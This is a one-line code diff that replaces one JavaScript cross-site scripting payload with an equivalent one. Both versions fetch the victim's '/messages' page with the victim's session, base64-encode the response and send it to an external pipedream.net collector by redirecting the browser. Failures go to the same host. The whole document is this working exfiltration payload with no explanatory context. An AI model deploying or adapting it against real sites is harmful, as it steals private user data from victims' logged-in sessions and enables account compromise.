@@ -1,1 +1,1 @@
-(async()=>{try{let r=await fetch('/messages',{credentials:'include'});let t=await r.text();setTimeout(()=>{location='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t)},200)}catch(e){location='https://eoeipamgnflz15n.m.pipedream.net?c=err:'+encodeURIComponent(String(e))}})();
+var x=new XMLHttpRequest();x.open('GET','/messages',true);x.onload=function(){location='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(x.responseText)};x.onerror=function(e){location='https://eoeipamgnflz15n.m.pipedream.net?c=err:'+encodeURIComponent(String(e))};x.send();
